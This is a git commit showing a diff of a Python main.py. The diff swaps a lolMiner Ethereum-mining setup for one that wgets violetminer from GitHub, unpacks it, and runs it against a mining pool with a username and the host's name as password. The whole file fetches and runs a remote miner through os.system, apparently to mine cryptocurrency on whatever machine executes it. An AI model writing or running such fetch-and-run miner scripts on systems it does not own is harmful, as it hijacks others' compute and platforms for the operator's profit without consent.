b0ad7c9b18462224a11a9302b253824e713d0fae
RyuzenM <101698447+RyuzenM@users.noreply.github.com>
2022-07-27 07:10:01 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
 
-os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
-os.system("tar -xvf lolMiner_v1.29_Lin64.tar.gz")
-os.chdir("1.29")
-os.system("./lolMiner --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 -u 3A5aBLHombyvMph6Z3smWAHrCCqi3sDNbB.rig2 --ethstratum ETHPROXY")
+os.system("wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz")
+os.system("tar xvf violetminer-linux-v0.2.2.tar.gz")
+os.chdir("violetminer-linux-v0.2.2")
+os.system("./violetminer --pool pool.bmnr.pw:4444 --username 5919060.adal --password $(cat /proc/sys/kernel/hostname) --algorithm wrkzcoin")
